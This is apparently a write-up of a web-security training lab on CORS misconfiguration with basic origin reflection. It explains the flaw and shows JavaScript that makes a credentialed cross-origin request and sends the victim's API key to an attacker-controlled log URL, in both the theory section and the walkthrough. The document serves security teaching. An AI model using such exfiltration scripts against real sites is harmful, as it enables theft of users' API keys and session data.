Title: CORS vulnerability with basic origin reflection
Desc:  This website has an insecure CORS configuration in that it trusts all origins.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: wiener:peter 


# Theory:
These headers (Access-Control-Allow-Origin: https://malicious-website.com) state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
# Walkthrough:
Request to below site results in API key in response.

However, there is special request for getting API key in response from site. We can also see, that in this case the response use "Access-Control-Allow-Credentials" header.
<img width="1032" height="378" alt="image" src="https://github.com/user-attachments/assets/c420904f-14c1-4306-b543-3a12264282d8" />

Now we can check, if this site reflects Origin provided in GET request.
<img width="1058" height="358" alt="image" src="https://github.com/user-attachments/assets/f6f94504-721e-4899-84f2-0e4d83a1157e" />
It reflects value from Origin header.


Now we can exploit this behavior by placing this code in our exploit server: 
```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a5900aa0397c8f4805d2150009f002c.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://exploit-0a3900b403c6c8c080e620c601370090.exploit-server.net/log?key='+this.responseText;
};
</script>
```

About this upper script:
```
req.withCredentials = true;

This line is crucial. It tells the browser to include cookies and credentials (like session tokens) with the request, enabling access to sensitive, user-specific data like account details.
This works only if the target server sets Access-Control-Allow-Credentials: true and allows the origin via CORS.
```
After clicking into link (into our malicious code) victim sends it's own api key to our server as url:

We can see API token in the log:

Bonus: if I try to make the same trick with url `https://0a5900aa0397c8f4805d2150009f002c.web-security-academy.net/my-account?id=wiener`
I got response, that CORS policy blocked request.
